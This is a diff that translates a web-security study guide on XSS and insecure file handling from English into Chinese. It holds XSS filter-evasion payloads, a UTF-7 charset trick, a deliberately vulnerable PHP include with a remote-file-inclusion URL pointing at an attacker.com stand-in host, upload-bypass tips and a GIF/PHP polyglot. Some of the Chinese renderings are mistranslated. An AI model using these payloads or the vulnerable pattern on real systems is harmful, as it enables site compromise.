@@ -433,24 +433,25 @@ GET /Vuln.jsp?p1=<script>evil();</script>
 
 ### XSS壳（Shell） & XSS隧道（Tunnel）
 
-* XSS backdoor which allows an attacker to control a victim's browser by sending it commands.
-* Attacker requests are proxied through XSS shell to perform requests as the victim.
-* Enables attacker to bypass IP restrictions and all forms of authentication.
+* XSS后门允许攻击者通过发送命令来控制受害者的浏览器。
+* 攻击者请求通过XSS壳代理来模仿受害者执行请求。
+* 允许攻击者绕过IP限制和所有形式的身份验证。
 
-### XSS Identification and exploit techniques
+### XSS识别和开发技术
 
-* Reflected: pick your payloads, fuzz, and observe response. [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
-* Persistent: include a unique string and grep responses.
-* DOM based: analyze JavaScript for objects influenced by user:
+* 反映:选择你的有效载荷，模糊，观察反应。(XSS过滤器逃避欺骗名单) [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
+* 持久性:包括一个惟一的字符串和grep响应。
+* DOM:分析JavaScript对受用户影响的对象:
 	- document.URL
 	- document.write
-* Bypass weak application filters and output encoding: try different variants:
+* 绕过脆弱的应用程序过滤器和输出编码:尝试不同的变体:
+
 ```
 <IMG SRC=javascript:alert('XSS')>// no"or;
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>//no'
 ```
-* Encode attack strings: URL, UTF-8, UTF-7
-* Trick browser into using alternative character set (necessity of encoding consistence):
+* 编码攻击字符串: URL, UTF-8, UTF-7
+* 欺骗浏览器使用替代字符集(编码一致性的必要性):
 ```
 <?php
 header('Content-Type: text/html; charset=UTF-7');
@@ -460,38 +461,38 @@ echo htmlentities($string);
 ?>
 ```
 
-### XSS Defenses
+### XSS防御
 
-* Validate (whitelist)
-* Convert HTML to HTML entity equivalent:
-	- < can be represented by &lt; or &#60
-	- > can be represented by &gt; or &#63
-* Consider context when encoding (JavaScript, inline-HTML, URLs)
+* 验证(白名单)
+* 将HTML转换为HTML实体等价:
+	- < 可以用 &lt; 或 &#60 表示
+	- > 可以用 &gt; 或 &#63 表示
+* 编码时考虑环境 (JavaScript, inline-HTML, URLs)
 
 
 ---
 
-## Insecure File Handling
+## 不安全的文件处理
 
-* Exploit include directive to execute file of attacker's choice.
-* File inclusion is used in a variety of web programming frameworks.
-* RFI more common in PHP, but Java and ASP/ASP.NET also susceptible to LFI:
+* 利用包括指令来执行攻击者的选择文件。
+* 文件包含在各种web编程框架中被使用。
+* RFI在PHP中更常见，但是Java和asp/asp也易受LFI影响。
 
 ```
 <?php $page = $_GET["page"];
 include($page); ?>
 ```
-where page is ***http://www.target.com/vuln.php?page=http://www.attacker.com/rooted.php***.
+页面在 ***http://www.target.com/vuln.php?page=http://www.attacker.com/rooted.php***.
 
-* RFI depends on whether **allow_url_fopen** and **allow_url_include** in php.ini.
+* RFI 取决于php.ini中是 **allow_url_fopen** 还是 **allow_url_include** 。
 
-* Insecure file uploads: upload fails to restrict file types and files are web accessible.
+* 不安全的文件上传:上传失败来限制文件类型和文件是可访问的。
 
-* Attempt to upload arbitrary file types (.jsp, .aspx, .swf): manipulate Content-Type request header.
+* 尝试上传任意文件类型 (.jsp, .aspx, .swf): 操作内容类型（Content-Type）的请求头
 
-* Once uploaded, determine if uploaded content is web accessible. If it is executable on the server, it's game over. If it is downloadable, it can exploit users with malicious content.
+* 一旦上传，确定上传的内容是否可以访问。如果它在服务器上是可执行的，它就结束了。如果它是可下载的，它可能会利用恶意内容的用户。
 
-* Try blended files:
+* 尝试混合文件：
 ```
 GIF89a(...binary data...)
 <?php phpinfo();  ?> (...
